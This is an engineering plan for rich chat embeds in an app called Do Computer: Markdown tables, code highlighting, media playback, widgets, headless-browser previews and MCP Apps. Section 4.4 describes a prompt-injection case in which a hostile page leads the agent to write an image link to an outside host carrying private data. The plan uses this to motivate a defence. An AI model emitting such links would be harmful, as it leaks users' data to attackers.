# Rich embeds: plan

**Status:** plan only, written 2026-10-13. Nothing in here is built. Section 7 lists the choices
that are the owner's to make, and section 8 what this plan leaves out.

The owner asked for what T3 Code has: tables in the chat itself, interactive HTML widgets that
look like the app, videos that play where they are mentioned, "all that stuff". This plan says
what T3 Code does, what Do Computer does today, where the gap is, and the order to close it in.

T3 Code was read at `/home/sawyer/tmp-t3code-read/t3code`, commit `511d20c6`. It is a reference:
everything below is to be written for this codebase, not copied, so it needs no notice.

## 1. What T3 Code does

Its rich embeds are four separate things.

**A Markdown renderer** (`apps/web/src/components/ChatMarkdown.tsx`, 3,483 lines, with the
plugin list in `packages/shared/src/markdownPipeline.ts`):

- Tables in a container that scrolls sideways with a fade, a button that lets cells wrap or
  keeps them on one line, and a menu to copy the table as Markdown or as CSV (`MarkdownTable`).
- Code blocks highlighted with Shiki, with a header (language or file name), copy and wrap
  buttons. Highlighting is cached and waits for the fence to close while a reply streams.
- A `mermaid` fence drawn as the diagram once the reply has settled, with a switch back to the
  source and a way to open it large (`MermaidDiagram.tsx`).
- Pictures: `![alt](src)` where `src` is a web address or a file on the machine. A file is
  served through a signed address. A picture alone on its line holds a box of its final size
  while it loads, so the rows under it do not move. A click opens it in a viewer with zoom and
  arrows through the message's other pictures. A right click saves or copies it.
- Video: the same `![alt](src)`. A source whose extension is a video's (`mediaKindFromPath`)
  becomes a player (`MediaVideoPlayer.tsx`): it loads nothing until it is near the screen, shows
  its first frame, pauses when the tab is hidden, and has a retry and an "open original" when
  it fails.
- Raw HTML in a reply, sanitized (`rehype-raw`, `rehype-sanitize`): `<details>` as a folding
  section, `<img width>`, `<kbd>` and the like. GitHub's `> [!NOTE]` alerts. Task-list boxes.
  Headings that links in the same reply can jump to.

**HTML renders** (`packages/shared/src/htmlRender.ts`, `apps/server/src/htmlRender/`): the
`html_render` tool that our `visual` tool was modelled on. Beyond what we took from it:

- `html_preview`: the page in a headless Chrome, returned to the agent as a screenshot, the
  height the page needs, and what it wrote to the console, errors included. The agent checks
  its page before the reader sees it.
- The server measures the page at nine widths when it is published, so each client reserves the
  right height before the page has loaded.
- A local picture named by its absolute path is put into the page as data.

**MCP Apps** (`packages/shared/src/mcpApp.ts`, `packages/client-runtime/src/mcpApps/host.ts`,
`McpAppFrame.tsx`): a tool of an MCP server can name a `ui://` page, and T3 Code shows that page
in the chat as a live view of the result. The page can call its server's tools, read its
resources, put a message into the chat, tell the model something for its next turn, go full
screen, and hand the reader a file. Calls that change something ask first.

**Media plumbing**: byte ranges on the route that serves files (`apps/server/src/http.ts`), so a
video can be scrubbed; a side panel that shows video, sound, PDF, CSV as a table, and HTML
(`components/files/`); a video the person attached shown as a thumbnail that plays.

The phone app has its own version of each: `HtmlRenderWebView`, `McpAppWebView`,
`ThreadMarkdownImage`, `ThreadMarkdownVideo`.

## 2. What Do Computer does today

- **Markdown in a reply** is `apps/web/src/components/chat/markdown.tsx`: 21 lines,
  `react-markdown` with `remark-gfm`, and one override that opens links in a new tab. A table is
  drawn, with a full grid and no header style, and it cannot be copied or widened. Code has no
  colors and no copy button. A picture at a web address loads; one named by a library path does
  not, though `library/doc-markdown.tsx` already does exactly that for a document. Raw HTML is
  shown as its source.
- **The `visual` tool** (`packages/agent/src/visuals.ts`, `packages/protocol/src/visual.ts`) is
  close to T3 Code's `html_render`, and ahead of it in places: the page is a file of the
  library, it can be shared and pinned, and every library page gets the app's tokens when it is
  served (`theme.ts`). The frame already speaks the MCP Apps message names for theme, height
  and opening a link. What it lacks: any way for the agent to see what it drew, a height known
  before the page loads (the frame starts at 240px and jumps), and styles for controls. The
  base styles cover the page, text, a table and a field's font; a `<button>` is still the
  browser's grey one unless the agent styles it.
- **The agent is told to draw tables as visuals.** The `visuals` section of its instructions
  lists "a table of figures" beside a chart. So a table that would read well in the reply
  itself becomes a framed page.
- **Video and sound are shown nowhere in the app.** `kindOf` in `apps/web/src/lib/library.ts`
  knows markdown, page, image and text; an `.mp4` is "This kind of file cannot be shown here
  yet". `FileCard` previews four raster types and nothing else. The one place that plays media
  is a shared link (`mediaPage` in `apps/web/src/server/site-pages.tsx`).
- **Files are served whole.** `BlobStore.get` in `packages/runtime` returns all the bytes, and
  neither library route answers a `Range` request. A browser can play a short clip that way.
  Safari will not play one at all without ranges, and nothing can be scrubbed before it has
  fully arrived. The file route also sends everything but four image types as
  `application/octet-stream` to download. A file can be 25 MB at most.
- **Three tables say what a file is**: `KINDS` (web), `TYPES` (`library-store.ts`), and
  `PREVIEWABLE`/`INLINE_TYPES`. They do not agree: `TYPES` knows `mp4` and `mp3`, `KINDS` does
  not.
- **Connectors return text.** Nothing reads a `ui://` resource, so no MCP App is ever shown.
- **The phone app** has its own Markdown parser with tables and pictures
  (`apps/mobile/src/ui/markdown.tsx`) and shows a visual in a web view. It has `expo-audio` and
  no video module.

## 3. The gap

| | T3 Code | Do Computer | Phase |
| --- | --- | --- | --- |
| Table in a reply: scroll, wrap, copy | yes | plain grid | 1 |
| Code: colors, copy, wrap, title | yes | none | 1 |
| Mermaid diagram | yes | no | 1 |
| Folding sections, alerts, task boxes | yes | no | 1 |
| Picture: own file, reserved box, viewer | yes | web addresses only, no viewer | 1 |
| Video in a reply | yes | no | 2 |
| Sound, PDF, CSV as a table | side panel | no | 2 |
| Byte ranges | yes | no | 2 |
| HTML page in the chat, themed | yes | yes | — |
| Page shared, pinned, kept as a file | no | yes | — |
| Styled controls in a page | no (variables only) | no (variables only) | 3 |
| Page talks back to the chat | MCP Apps only | no | 3 |
| Height known before load | measured on the server | no | 3, 4 |
| Agent sees its page first | `html_preview` | no | 4 |
| MCP Apps from connectors | yes | no | 5 |
| Phone: video | yes | no | 6 |

## 4. The design

### 4.1 One embed, chosen by what the thing is

One module says what a thing is, and one component shows it. That replaces the three tables and
the special cases in `FileCard` and the library viewer.

- `packages/protocol/src/embed.ts`: `embedKind(name, contentType)` gives `image`, `video`,
  `audio`, `page`, `table` (CSV, TSV), `pdf`, `markdown`, `text` or `other`, and the content
  type for an extension. `KINDS`, `TYPES`, `PREVIEWABLE` and `INLINE_TYPES` are then derived from
  it. Web, phone and server all read the same answer.
- `apps/web/src/components/embed/`: `<Embed>` takes a library file or a web address and shows
  it as its kind, at one of three sizes: in a reply, beside the chat, or the whole library pane.
  `FileCard`, the library viewer, the pin shelf and the Markdown renderer all use it.

### 4.2 Three ways an embed gets into a chat

1. **`send_file`**, as now. The card becomes the thing: a sent `.mp4` is a player, a `.csv` a
   table, a `.mp3` a sound bar, with the name and the open, download, share and pin buttons
   under it. Nothing changes for the agent.
2. **A reference in the reply**: `![What it is](recordings/demo.mp4)` on a line of its own,
   where the path is a library path or a web address. The renderer asks `embedKind` and shows a
   picture, a player, a sound bar, a table, or a page's frame. A path that is not in the library
   shows a quiet chip with its words. This is how T3 Code embeds video, with the library in the
   place of its workspace. A file the agent writes into its library folder on a computer is in
   the library once the folder is read, so most of the time no tool call is needed.
3. **`visual`**, as now, for a page the agent writes for the reply.

### 4.3 Serving media

- `BlobStore.get(key, { range })` in `packages/runtime`, on both hosts: R2 takes a range, and
  the Node host reads part of the file. `registerHostConformance()` holds both to it.
- The view route (`#page` in `library-store.ts`) answers `Range` with `206`, says
  `Accept-Ranges: bytes`, and stops reading a whole file into memory for anything but a page.
- Media in a chat is asked for at the view address (`/d/<agent>/<view>/<path>`), which already
  serves the right type and needs no session. A view address lasts 6 to 12 hours; a player that
  fails after that asks for the listing again, takes the new address, and seeks back to where
  it was.
- A PDF needs a frame that is not sandboxed, because the browser's viewer will not run in one.
  It is served that way for `application/pdf` only, and shown beside the chat and in the
  library, never in a reply.

### 4.4 Remote media

A picture at any web address loads today the moment a reply mentions it. An agent that has read
a hostile page can be made to write `![](https://somewhere/?q=<something private>)`, and the
reader's browser delivers it. Video and sound widen that. The plan: library media loads at
once; media at a web address is a box that names its host and loads on a click, with "always
from this host" kept for the workspace. `referrerpolicy="no-referrer"` either way. This is a
change to what happens today and is the owner's call (section 7).

## 5. The phases

Each is a pull request that stands alone. Phases 1 to 3 are the request; 4 to 6 are what is left
of T3 Code's lead after them.

### Phase 0: mock-up

`prototypes/rich-embeds`: one long reply that has every embed in it, in light and dark and at a
phone's width: a table, a code block, a diagram, a picture, a video, a sound file, a CSV, a
folding section, a widget with buttons and a slider, and remote media before its click. The
owner sees it before any screen is built.

### Phase 1: Markdown

- A `components/markdown/` folder with one list of plugins and one set of components, used by
  the chat, by a library document (`DocMarkdown`) and by a shared document
  (`site-pages.tsx`, which renders on the server, where the parts that need a browser fall back
  to plain).
- **Tables**: a wrapper that scrolls sideways, a header row that stays, hairlines between rows
  in place of the grid, figures in tabular numerals, a wrap switch, and copy as Markdown or CSV.
- **The agent's instructions** stop sending "a table of figures" to `visual`: a table goes in
  the reply as Markdown, and a visual is for what a table cannot do.
- **Code**: Shiki, loaded only when a reply has a fence, with a theme made of CSS variables so
  it follows light and dark without highlighting again. The syntax colors go in `THEME_TOKENS`,
  so a library page can use them too. A header with the language, copy and wrap.
- **Mermaid**, loaded only when a reply has such a fence, drawn when the fence has closed.
- **Sanitized HTML**: `rehype-raw` and `rehype-sanitize` with a short list: `details`,
  `summary`, `kbd`, `sub`, `sup`, `mark`, `br`, and `img` with a width and height. No `style`,
  `script` or `iframe`.
- Alerts, task boxes, and headings a link can jump to.
- **Pictures**: a library path resolves, as it does in a document. A picture alone on its line
  holds its box while it loads. A click opens a viewer with zoom, arrows, download and copy.
- A link to a library file opens it beside the chat.

New packages: `rehype-raw`, `rehype-sanitize`, `shiki`, `mermaid`. The last two are large and
are loaded on demand, so the first page does not grow.

### Phase 2: media

- `embed.ts`, `<Embed>`, and the serving changes of 4.1 and 4.3.
- **Video**: a native player in a 16:9 box that the video is fitted inside, so nothing moves when
  its real size is known. It loads nothing until it is near the screen, then its first frame.
  It pauses when the tab is hidden. When it fails: retry, and download.
- **Sound**: the browser's own bar, with the file's name.
- **CSV and TSV**: the first 100 rows and 30 columns as a table, with a way to the whole file.
- **PDF**: beside the chat and in the library.
- `FileCard` and the library viewer show all of these; "cannot be shown here yet" is left for
  what truly cannot.
- References in a reply (4.2, the second way), and the agent told how to write one.
- A video or sound file the person attaches is shown in their message, not only named.
- Remote media as 4.4 decides.
- The 25 MB cap stays. Raising it means streaming files in from machines and to R2 in parts,
  which is its own piece of work (section 8).

### Phase 3: widgets

A visual is already an interactive page in the app's colors. These make one easy to get right:

- **Styled controls.** The base styles a page opts into with `data-dc-page` grow to cover
  `button` (filled, and quiet with `data-variant`), `input`, `select`, `textarea`, checkboxes,
  radios and sliders (`accent-color`), `details`, `progress` and `meter`. All in `:where()`, so
  a page's own styles still win. Because the block is put in when a page is served, every page
  already written gets them. `PAGE_STYLE_GUIDE` says so in two lines.
- **Talking back.** The frame learns three more MCP Apps requests, and the page gets a small
  `window.dc` so an agent does not write JSON-RPC by hand: `dc.say(text)` puts text in the
  message box for the person to send, `dc.expand()` shows the page large, `dc.save(name, text,
  type)` hands the reader a file. A widget with choices can then answer the agent.
- **Data beside the page.** Not as first written: a page in a chat cannot `fetch` a library
  file beside it, and that is on purpose (the address it is served at opens the whole library,
  so the library does not let a page read with it). A widget over a large file would need the
  agent to name the files the page may read and the app to hand them over; that is not in this
  phase.
- **No jump.** A client remembers each page's height for its width, and holds that box next
  time. While the agent is still writing a visual, the chat holds a box with its title, where
  today there is nothing until the call ends.
- **Errors.** The few lines put in a page's head also catch an uncaught error and tell the
  frame, which shows "This page hit an error" with a button that sends the error to the agent.
- **Checks without a browser.** `visual` reads the page it is given and answers with what it
  can see is wrong: a color written out where a variable belongs, `100vh`, something loaded
  from another site, no viewport. The agent fixes it in the same turn.
- From T3 Code's frame: `loading="lazy"`, and no white flash in dark mode before the page is in.

### Phase 4: the agent sees its page

A `visual_preview` tool: the agent gives it a page and gets back a screenshot, the height the
page needs at several widths, and what the page wrote to its console, uncaught errors included.
The heights are kept with the visual when it is drawn, so every client holds the right box at
first paint.

A screenshot can only be made by something that draws HTML, and the server cannot: on
do.computer it is a Worker. So the tool sits on one interface, `PagePreviewer`, with an
implementation for each kind of deployment, and is offered only where there is one.

#### 4a. On Cloudflare: Browser Run

Cloudflare's headless browser is now called Browser Run (it was Browser Rendering). Read in its
documentation on 2026-10-13; nothing here has been run against an account.

- **What it is.** A `browser` binding in `wrangler.jsonc` (`"browser": { "binding": "BROWSER" }`)
  and `@cloudflare/puppeteer`, a fork of Puppeteer 22. `puppeteer.launch(env.BROWSER)` starts a
  Chrome on Cloudflare's side and the Worker drives it. It works from a Durable Object, which is
  where our tools run, and needs `nodejs_compat`, which we have.
- **Why not the one-call screenshot.** There is also `env.BROWSER.quickAction("screenshot", …)`,
  which takes HTML and returns a picture with no library. It gives no console and no heights,
  and it does not run in local development, so it is not enough.
- **Limits.** Workers Paid: 200 browsers at once and 3 launches a second. Workers Free: 3 at
  once, one launch every 20 seconds, 10 minutes of browser a day. A browser shuts itself after
  60 seconds with nothing asked of it.
- **Cost.** Workers Paid includes 10 browser hours a month, then $0.09 an hour, and 10 browsers
  at once (the month's average of each day's peak), then $2 for each one over. A preview is a
  few seconds of browser, so the included hours are several thousand previews a month, and a
  thousand more are about an hour and a half of browser, 13 cents. What could cost money is concurrency, which is why
  previews share a browser (below).

How it is built:

1. `PagePreviewer` in `packages/runtime`: `preview({ url, widths, appearance }) → { png,
   heights, console }`. `createAgentActor` takes one as an option, as it takes `webSearch`, and
   `visuals()` adds the tool only when it has one.
2. `packages/runtime/src/cloudflare/preview.ts`: the Browser Run implementation, given
   `env.BROWSER` in `server.cloudflare.ts`. The binding is optional in `Env`, so a deployment
   without it has no tool and nothing else changes.
3. **The page is a draft at a real address.** The library keeps the draft for a few minutes
   under a reserved name beside `visuals/`, and the browser opens its view address. That is the
   address a client opens, so the page gets the same tokens put into it, the same
   `Content-Security-Policy: sandbox` and so the same origin that is nobody's, and the files
   beside it load. A page that would break in the chat (one that uses `localStorage`, say)
   breaks in the preview too. The page is laid out as part of a reply the way the phone app
   does it: the mark is set before the page's own scripts run, since the page's own lines only
   do that inside a frame.
4. **One routine, any Puppeteer.** Open a page, listen for `console` and `pageerror`, go to the
   address, wait for load, read the height at each width (320, 390, 720), screenshot at the
   reply's width, close. It is written against Puppeteer's `Page`, so 4b reuses it whole.
5. **Sharing a browser.** A preview first looks for a running browser with room
   (`puppeteer.sessions()`, `puppeteer.connect()`), and launches one only when there is none.
   Each preview gets a browser context of its own and disconnects when done; the browser shuts
   itself a minute after the last one. Quiet hours cost nothing, and a busy hour is one or two
   browsers, not one per Dood.
6. **Bounds.** 10 seconds a preview, a screenshot at most 2000px tall, the console cut at a few
   kilobytes, and a count per workspace per hour. When Browser Run answers that it is busy, the
   tool says so and the agent draws without looking.
7. **The agent's side.** The `visual` tool's description says to preview first, as T3 Code's
   does. The screenshot goes back as a picture in the tool's result, as a screen's does today.

What to find out first, in a spike before anything else is written:

- That the fork does what the routine needs: `console` and `pageerror` events, a script before
  the page's own, and reading a height. It is Puppeteer's own `Page`, so it should; the
  documentation only shows `goto`, `evaluate` and `screenshot`. (`evaluate` can return only
  strings, numbers and booleans there, so the heights come back as one string.)
- Whether the binding works under the Cloudflare Vite plugin, which is how this app runs
  locally on Workers. The documentation covers `wrangler dev` only, where it starts a Chrome on
  the machine.
- Whether the token Actions deploys with needs another permission for a Worker with this
  binding.
- How long a launch takes, which decides whether sharing a browser is worth its code on day one.

#### 4b. On a Node server: a Chrome on the machine

`puppeteer-core` and whichever Chrome is found (`DC_CHROME_PATH`, or the usual places), running
the same routine. Where none is found there is no tool. This is also what the tests use, with
the Chromium Playwright already keeps here. The desktop app running the server itself would use
its own Chromium in a hidden window; that waits for the local mode to land.

#### 4c. Where there is neither: the Dood's own machine

A Dood with a machine has a headless browser there already (the `browsing-the-web` skill's
`browse.mjs screenshot`). Its instructions can say to look at a draft's address with it. Nothing
is built for this beyond the draft address; it is the fallback, not the plan.

### Phase 5: MCP Apps from connectors

The connectors' client says it takes UI resources. When a tool that names a `ui://` page
finishes, the page is read (5 MB at most), kept as a blob that is not a library file, and shown
in the frame a visual uses, with the rest of the bridge: the tool's input and result, calls to
the server's tools through the approvals that already exist, resource reads, and teardown. The
page's declared origins become its `Content-Security-Policy`, sent as a header. This runs a
third party's HTML, so it wants its own review before it ships.

### Phase 6: the phone app

Sound with `expo-audio`, a CSV through the table block the parser already has, the picture
viewer, and controls in a visual for free (they are in the served page). Video needs
`expo-video`, a native module, so it needs a new build of the app. It is checked in the simulator
on the Air; no cloud build is started without the owner asking.

### Elsewhere

- **Slack** is sent a visual as its file today. A library file embedded in a reply goes the same
  way. How a Markdown table reads in Slack was not looked at for this plan.
- **A shared link** already plays video and sound. It gains the table for a CSV and the new
  Markdown.

## 6. Tests

- `packages/protocol/test/embed.test.ts`: kinds and types, and that the old tables agree.
- Host conformance: ranged reads on both hosts. A library test for `206`, a range past the end,
  and a page still served whole with its theme.
- The Markdown pipeline: that the sanitizer drops `script`, `style`, `iframe` and event
  attributes, on the client and in `site-pages.test.ts`.
- `apps/web/e2e/embeds.spec.ts` on the echo model: a table copied as CSV, a code block copied,
  a sent `.mp4` that plays and seeks, a reference to a library picture, a remote picture that
  waits for its click, a widget whose button fills the message box.
- A page with every control, in `themed-pages.spec.ts`, in light and dark.
- Real video is checked in Chromium here and in Safari on the Air, since Safari is where ranges
  matter.

## 7. Choices that are the owner's

Answered on 2026-10-13:

1. **"Tables inline"** meant Markdown: a table is in the reply, well drawn, and the agent stops
   making a visual of one.
2. **Remote media waits for a click** (4.4): fine.
3. **Video from other sites** (YouTube, Vimeo, Loom): not wanted.
4. **The 25 MB cap** stays for now.

Still open:

5. **Phase 4.** The owner asked why the deployment would need a browser, and then to look at
   Cloudflare's. It fits (4a) and is now the plan for do.computer. Open: turning the binding on
   for do.computer, which is a change to that account, and whether a Node server's Chrome (4b)
   is wanted for more than the tests.
6. **Phase 5**, MCP Apps. The largest piece here, and it only pays off for connectors that ship
   a UI.
7. **A widget's `dc.say` fills the message box** and the person sends it. It could send by
   itself; T3 Code asks first.
8. **A page embedded by reference** (`![](visuals/x.html)` shows the frame again). It falls out
   of the design, T3 Code has no such thing, and it can be turned off.

## 8. Left out

- Files over 25 MB, thumbnails made on the server, and re-encoding a video: one the reader's
  browser cannot play is a card with a download.
- T3 Code's coding-specific pieces: file links that open an editor, pull request previews,
  favicons on links, citations.
- Copying a selection as Markdown, and parsing a streaming reply in increments. The second
  matters if long replies start to stutter once highlighting is in.
- Editing a table or a widget in place.

## 9. What could go wrong

- **Bundle size.** Shiki and Mermaid are each larger than the rest of the chat. They must load
  on demand, and the build is checked for it.
- **Workers memory.** Ranged reads must not read the file first. R2 does this natively; the
  check is on do.computer, which cannot be seen signed in from here.
- **Sanitized HTML is new surface.** The list is short on purpose, and what is outside it stays
  source text.
- **Old pages get the new control styles.** A page that styled its own buttons keeps them, since
  the new rules are in `:where()`; a page that left buttons bare changes look. That is the
  point, and it is still a change to pages already shared.
